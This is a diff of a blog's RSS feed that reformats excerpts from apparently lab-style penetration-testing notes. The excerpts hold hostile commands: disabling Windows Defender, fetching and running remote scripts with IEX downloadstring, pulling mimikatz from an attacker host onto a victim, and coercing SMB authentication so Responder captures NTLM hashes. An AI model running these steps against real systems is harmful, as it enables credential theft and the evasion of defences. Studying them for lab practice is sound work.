@@ -13,7 +13,7 @@
       <pubDate>Tue, 05 May 2020 00:54:12 +0800</pubDate>
       
       <guid>https://0xade1.github.io/devdraft/posts/2020/05/commandovm-preparation/</guid>
-      <description>prepare your windowsVM  Download OVA from https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/ Install French keyboard Windows update Disable Tamper protection from Windows Defender  https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-windows-defender-antivirus.html   Reboot Snapshot your VM : &amp;ldquo;Before-Commando-VM&amp;rdquo;  1  Set-ExecutionPolicy Unrestricted   Install CommandoVM  Download and Execute Commander VM by Mandiant  1  IEX(new-object net.webclient).downloadstring(&amp;#39;https://raw.githubusercontent.com/fireeye/commando-vm/master/install.ps1&amp;#39;)   Failed to install 1 2  cinst dnSpy.fireeye x64dgb.fireeye proxycap.fireeye metasploit.fireeye amass.docker.fireeye PoshC2.fireeye spiderfoot.docker.fireeye wfuzz.fireeye watson.fireeye PwndPasswordsNTLM.fireeye mimikatz.</description>
+      <description>prepare your windowsVM Download OVA from https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/ Install French keyboard Windows update Disable Tamper protection from Windows Defender https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-windows-defender-antivirus.html Reboot Snapshot your VM : &amp;ldquo;Before-Commando-VM&amp;rdquo; 1 Set-ExecutionPolicy Unrestricted Install CommandoVM Download and Execute Commander VM by Mandiant 1 IEX(new-object net.webclient).downloadstring(&amp;#39;https://raw.githubusercontent.com/fireeye/commando-vm/master/install.ps1&amp;#39;) Failed to install 1 2 cinst dnSpy.fireeye x64dgb.fireeye proxycap.fireeye metasploit.fireeye amass.docker.fireeye PoshC2.fireeye spiderfoot.docker.fireeye wfuzz.fireeye watson.fireeye PwndPasswordsNTLM.fireeye mimikatz.fireeye Directory C:\Users\User\AppData\Local\ChocoCache cannot be removed because it is not empty. successfully reinstalled with cinst openvpn flare-floss.</description>
     </item>
     
     <item>
@@ -23,10 +23,10 @@
       
       <guid>https://0xade1.github.io/devdraft/posts/2020/05/mimikatz/</guid>
       <description>Identification of the processor architecture
-1 2  PS C:\users\administrator\Music&amp;gt; $env:PROCESSOR_ARCHITECTURE AMD64   Upload mimikatz
-1 2 3  wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200208/mimikatz_trunk.zip unzip mimikatz_trunk.zip -d mimikatz cp mimikatz/x64/mimikatz.exe http/   We download Mimikatz and execute after having disabled Windows Defender
-1 2 3  PS C:\users\administrator\Music&amp;gt; iwr -uri http://10.10.14.73:8080/mimikatz.exe -outfile mimikatz.exe PS C:\users\administrator\Music&amp;gt; Set-MpPreference -DisableRealtimeMonitoring $true PS C:\users\administrator\Music&amp;gt; ./mimikatz.exe exit   output:
- .#####. mimikatz 2.2.0 (x64) #18362 Feb 8 2020 12:26:49 .</description>
+1 2 PS C:\users\administrator\Music&amp;gt; $env:PROCESSOR_ARCHITECTURE AMD64 Upload mimikatz
+1 2 3 wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200208/mimikatz_trunk.zip unzip mimikatz_trunk.zip -d mimikatz cp mimikatz/x64/mimikatz.exe http/ We download Mimikatz and execute after having disabled Windows Defender
+1 2 3 PS C:\users\administrator\Music&amp;gt; iwr -uri http://10.10.14.73:8080/mimikatz.exe -outfile mimikatz.exe PS C:\users\administrator\Music&amp;gt; Set-MpPreference -DisableRealtimeMonitoring $true PS C:\users\administrator\Music&amp;gt; ./mimikatz.exe exit output:
+.#####. mimikatz 2.2.0 (x64) #18362 Feb 8 2020 12:26:49 .## ^ ##. &amp;quot;A La Vie, A L&#39;Amour&amp;quot; - (oe.</description>
     </item>
     
     <item>
@@ -36,9 +36,9 @@
       
       <guid>https://0xade1.github.io/devdraft/posts/2020/05/responder/</guid>
       <description>Installation My docker environment do not have access to utun4 Kali Responder
-1 2 3 4 5  git clone https://github.com/lgandx/Responder.git cd Responder sudo python Responder.py -i 10.10.14.73 -wrf [...] [+] Listening for events...   Then from the victim side, we use powershell to attempt collecting the password hash of the current user:
-1  Get-Content \\10.10.14.73\randomFileName   Responder will intercept the following hash
-1 2 3 4 5 6  [+] Listening for events.</description>
+1 2 3 4 5 git clone https://github.com/lgandx/Responder.git cd Responder sudo python Responder.py -i 10.10.14.73 -wrf [...] [+] Listening for events... Then from the victim side, we use powershell to attempt collecting the password hash of the current user:
+1 Get-Content \\10.10.14.73\randomFileName Responder will intercept the following hash
+1 2 3 4 5 6 [+] Listening for events... [SMB] NTLMv2-SSP Client : 10.</description>
     </item>
     
   </channel>
